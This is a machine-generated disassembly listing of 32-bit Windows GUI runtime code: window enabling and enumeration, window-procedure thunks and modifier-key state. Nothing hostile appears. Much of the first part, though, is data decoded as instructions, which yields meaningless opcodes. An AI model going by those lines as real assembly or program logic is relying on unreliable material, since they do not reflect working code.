add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4184 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x84
inc ecx
add [ esi + 0xc004184 ] dh
add al [ eax ]
add [ ecx + eax * 4 + 0x41 ] dl
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_4183d8
test al 0x16
inc ebx
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x3c ] 0xb7
inc ecx
add [ eax + 0x55 ] ch
inc ebx
add [ eax ] dh
jecxz r-xdata
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add ah cl
mov [ edx ] sub_42cd20
cwde
0x42
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add ah cl
mov ebx 0xfa300042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x3e7bffbc ] bl
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax + 0x48 ] ch
inc ebx
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
sub_418454
mov [ ebx + eax * 2 ] dl
add [ eax - 0xc ] bl
inc edx
add al ch
inc esp
inc ebx
add [ ebp + eax * 2 + 0x3f740043 ] dl
inc ebx
add [ ebp + eax * 2 + 0x43 ] ch
add [ eax - 0x40 ] ch
inc ecx
add [ eax + edi * 4 + 0x41 ] ch
add [ eax + 0x430e ] ah
retn 0x41
sub_41859d
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
hlt
jb r-xdata
add bh bh
push 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
dec [ eax - 0x3bffbd34 ]
jae r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
dec ebp
add [ eax ] al
[ eax ]
insb
push 0x64004279
add [ eax ] al
jmp [ eax + eax ]
int3
add bh bh
mov ah cl
inc edx
add ah al
jb r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
dec esp
js r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
dec esp
add [ ebx - 0x74010000 ] cl
sub_418d48
test al 0x16
inc ebx
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x3c ] 0xb7
inc ecx
add [ eax + 0x55 ] ch
inc ebx
add [ eax ] dh
jecxz r-xdata
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add [ eax ] bh
mov [ ecx ] 0x20
int 0x42
add [ eax - 0x77ffbd36 ] bl
adc al 0x43
add [ eax - 0xc ] bl
inc edx
add al ch
inc esp
inc ebx
add [ ebp + eax * 2 + 0x3f740043 ] dl
inc ebx
add [ ebp + eax * 2 + 0x43 ] ch
add [ eax - 0x40 ] ch
inc ecx
add [ eax + edi * 4 + 0x41 ] ch
add [ eax + 0x1800430e ] ah
les eax [ ecx ]
hlt
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add [ ebp + eax * 8 + 0x41 ] dl
add [ eax ] dh
cli
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x3d0bffbc ] bl
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax + 0x48 ] ch
inc ebx
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
sub_419828
test al 0xc2
inc esp
add [ eax + 0x40041f4 ] bl
rol [ eax + eax + 0x18 ] 0xc0
inc esp
add [ eax + 0x680041ca ] bl
push ebp
inc ebx
add [ eax + edx * 8 + 0x41 ] cl
add [ ecx * 8 - 0x33afffbd ] cl
inc ecx
add [ eax + 0x100041cc ] ch
into
inc ecx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add [ eax + ebx * 8 + 0x41 ] bl
add al ah
daa
inc esp
add [ ebp + ebx - 0x396bffbe ] ah
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax ] bh
aam 0x41
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ eax - 0x2b ] ah
inc ecx
add al bl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add [ eax + ebx * 8 ] cl
inc ecx
add [ esi + edx * 8 ] bh
inc ecx
add [ eax - 0x53ffbd36 ] bl
fadd [ ecx ]
pop eax
hlt
sub_419ab4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
jb r-xdata
or al 0xcd
inc ebx
add [ eax - 0x34 ] dl
inc ecx
add [ eax + 0x100041cc ] ch
into
inc ecx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add [ eax + ebx * 8 + 0x41 ] bl
add al ah
daa
inc esp
add [ ebp + ebx - 0x396bffbe ] ah
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax ] bh
aam 0x41
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ eax - 0x2b ] ah
inc ecx
add al bl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add [ eax + ebx * 8 ] cl
inc ecx
add [ esi + edx * 8 ] bh
inc ecx
add [ eax - 0x53ffbd36 ] bl
fadd [ ecx ]
pop eax
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
fwait
inc ecx
add al dl
add al [ eax ]
add al dh
xchg edi eax
inc ecx
add [ esp + ebp ] bh
inc esp
add [ eax + ecx * 8 ] ah
inc ecx
add [ eax ] bl
0x41
sub_419ae8
test al 0xc2
inc esp
add [ eax + 0x40041f4 ] bl
rol [ eax + eax + 0x18 ] 0xc0
inc esp
add [ eax + 0x680041ca ] bl
push ebp
inc ebx
add [ eax + edx * 8 + 0x41 ] cl
add [ ecx * 8 - 0x33afffbd ] cl
inc ecx
add [ eax + 0x100041cc ] ch
into
inc ecx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add [ eax + ebx * 8 + 0x41 ] bl
add al ah
daa
inc esp
add [ ebp + ebx - 0x396bffbe ] ah
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax ] bh
aam 0x41
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ eax - 0x2b ] ah
inc ecx
add al bl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add [ eax + ebx * 8 ] cl
inc ecx
add [ esi + edx * 8 ] bh
inc ecx
add [ eax - 0x53ffbd36 ] bl
fadd [ ecx ]
pop eax
hlt
sub_419be8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
popfd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
popfd
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add al dl
add al [ eax ]
add al dh
xchg edi eax
inc ecx
add [ esp + ebp ] bh
inc esp
add [ eax + ecx * 8 ] ah
inc ecx
add [ eax ] bl
0x41
sub_419c1c
test al 0xc2
inc esp
add [ eax + 0x40041f4 ] bl
rol [ eax + eax + 0x18 ] 0xc0
inc esp
add [ eax + 0x680041ca ] bl
push ebp
inc ebx
add [ eax + edx * 8 + 0x41 ] cl
add [ ecx * 8 + 0x20100043 ] cl
inc edx
add [ eax + 0x100041cc ] ch
into
inc ecx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add [ eax + ebx * 8 + 0x41 ] bl
add al ah
daa
inc esp
add [ ebp + ebx + 0x1e700042 ] ah
inc edx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax ] bh
aam 0x41
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ eax - 0x2b ] ah
inc ecx
add al bl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add [ eax + ebx * 8 ] cl
inc ecx
add [ esi + edx * 8 ] bh
inc ecx
add [ eax - 0x53ffbd36 ] bl
fadd [ ecx ]
pop eax
hlt
sub_419dac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_419e04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl sub_419dac
inc ecx
add [ esi + ebx * 4 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ds [ esi + 0x980041 ]
add [ eax ] al
hlt
sub_419f98
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push 0xffffffec
mov eax [ ebp - 0x4 ]
push eax
call GetWindowLongA
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test [ ebp - 0xb ] 0x2
je r-xdata
test [ ebp - 0xb ] 0x2
jne r-xdata
and [ ebp - 0xc ] 0xfffffdff
or [ ebp - 0xc ] 0x200
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
push eax
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call SetWindowPos
sub_41a004
mov eax [ rw-data ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_425660
mov eax [ rw-data ]
call sub_4424d4
mov eax [ rw-data ]
call sub_442464
retn
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
push eax
call ShowOwnedPopups
sub_41a040
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_44ba5c
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call EnableWindow
sub_41a0b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_41a157
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41a120
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_41a040
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a15e
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
retn
sub_41a168
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
mov edx 0x8
mov eax [ ebp - 0x8 ]
call sub_44ba74
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call EnableWindow
sub_41a1bc
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
jmp r-xdata
sub_41a234
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_41a1bc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41a288
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
movzx eax [ ebp - 0x6 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SendMessageA
mov eax [ rw-data ]
cmp eax [ ebp - 0xc ]
sete [ ebp - 0x7 ]
mov al [ ebp - 0x7 ]
mov esp ebp
pop ebp
retn
sub_41a2c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x4 ] 0x1
sub_41a2f0
push ebp
mov ebp esp
add esp 0xfffffff4
call GetActiveWindow
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push sub_41a2c4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_41a324
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_422d48
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44620c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4227c8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x21 ] 0x2
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_422d24
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44620c
test eax eax
je r-xdata
sub_41a3d0
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a3f0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x5
mov edx [ ebp - 0x8 ]
sub edx eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_41a414
push ebp
mov ebp esp
add esp 0xfffffff4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x5 ]
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x9 ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_44bbe8
mov edx sub_41a3d0
mov eax [ ebp - 0x8 ]
add eax 0x5
call sub_41a3f0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6 ] eax
mov eax [ ebp - 0x8 ]
add eax 0xa
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0xe8
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_41a3f0
mov edx [ ebp - 0xc ]
mov [ edx + 0x1 ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x5 ] eax
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
add [ ebp - 0xc ] 0xd
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0xffc
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_41a4f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
sub_41a528
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x2d ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax DefWindowProcA
cmp eax [ ebp - 0x29 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80000000
push r-xdata
mov eax [ rw-data ]
push eax
push 0x80
call CreateWindowExA
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a414
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
push eax
call SetWindowLongA
sub_41a5e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
push eax
call GetWindowLongA
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call DestroyWindow
mov eax DefWindowProcA
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_41a4f4
sub_41a61c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x2 ] ax
mov al [ r-xdata ]
mov [ ebp - 0x3 ] al
test [ ebp - 0x2 ] 0x4
je r-xdata
test [ ebp - 0x2 ] 0x8
je r-xdata
or [ ebp - 0x3 ] 0x1
test [ ebp - 0x2 ] 0x1
je r-xdata
or [ ebp - 0x3 ] 0x4
test [ ebp - 0x2 ] 0x2
je r-xdata
or [ ebp - 0x3 ] 0x8
test [ ebp - 0x2 ] 0x10
je r-xdata
or [ ebp - 0x3 ] 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or [ ebp - 0x3 ] 0x20
mov al [ ebp - 0x3 ]
pop ecx
pop ebp
retn
or [ ebp - 0x3 ] 0x2
sub_41a678
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov al [ r-xdata ]
mov [ ebp - 0x5 ] al
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or [ ebp - 0x5 ] 0x1
test [ ebp - 0x1 ] 0x20
je r-xdata
or [ ebp - 0x5 ] 0x4
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
or [ ebp - 0x5 ] 0x2
sub_41a6c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov al [ r-xdata ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x10 ] 0x80
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x11 ] 0x80
je r-xdata
or [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x12 ] 0x80
je r-xdata
or [ ebp - 0x5 ] 0x4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1 ] 0x80
je r-xdata
or [ ebp - 0x5 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x2 ] 0x80
je r-xdata
or [ ebp - 0x5 ] 0x8
mov eax [ ebp - 0x4 ]
test [ eax + 0x4 ] 0x80
je r-xdata
or [ ebp - 0x5 ] 0x10
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
or [ ebp - 0x5 ] 0x20
sub_41a72c
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_41a793
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_40c9fc
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0x2 ]
call sub_44cc88
mov eax [ ebp - 0x14 ]
pop edx
call sub_44620c
test eax eax
sete [ ebp - 0x9 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a79a
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
sub_41a7a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41a7e8
push ebp
mov ebp esp
add esp 0xffffffec
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a85f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a866
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
sub_41a870
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov al [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa ] 0x50
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov ecx 0xa
xor edx edx
div ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] ax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x80000014
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a928
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1f ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41a944
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41b494
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b440
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
